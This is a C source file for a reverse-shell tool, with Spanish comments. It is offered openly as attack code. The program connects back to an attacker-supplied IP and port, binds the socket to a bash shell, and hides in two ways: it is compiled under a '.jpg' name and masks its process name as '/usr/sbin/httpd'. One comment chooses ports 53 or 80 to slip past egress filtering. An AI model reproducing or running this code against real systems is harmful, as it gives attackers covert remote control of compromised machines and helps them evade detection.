// rshell.pl 2.0 Reverse Shell     coded by Sha0 (http://BadChecksum.cjb.net)
// gcc rshell.c -o rshell.jpg -static -O2; strip rshell.jpg
// rshell.jpg <remoteip> <remoteport> <processname>

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
//#include <asm/signal.h>

int main (int argc, char **argv) {
	struct sockaddr_in host;
	struct hostent *hp;
	int sock;
	char connectbackip[20];
	char procname[30]="/usr/sbin/httpd";
	pid_t pid;

	if (argc < 3 || argc > 4) {
		fprintf(stderr,"hay que indicar la connectback ip, puerto y nombre de proceso\n");
		exit (0);
	}

	//TODO: buscar el primer proceso con mi getuid() (que no sea yo) y ponerme su nombre.
	strncpy (connectbackip,argv[1],18);

	if (argc == 4) 
		strncpy(procname,argv[3],29);
	

	host.sin_family = AF_INET;
	host.sin_port = htons (atoi(argv[2])); //quien no permitiria una salida al 53 o al 80?
	host.sin_addr.s_addr = inet_addr(connectbackip);
	//host.sin_addr.s_addr =  *((struct in_addr *)hp->h_addr); //si decidimos k vaya por dns
	
	sock = socket (AF_INET,SOCK_STREAM,0);
	connect (sock, (struct sockaddr *)&host, sizeof(host));

	pid = fork();
	if (pid != 0) {
		setsid();
		dup2(sock,0);
		dup2(sock,1);
		dup2(sock,2);
		execl ("/bin/bash",procname,0x00);    //tu Shell favorita
		close(sock);  //(codigo inalcanzable)
	}
	//kill (getpid(),9);
}
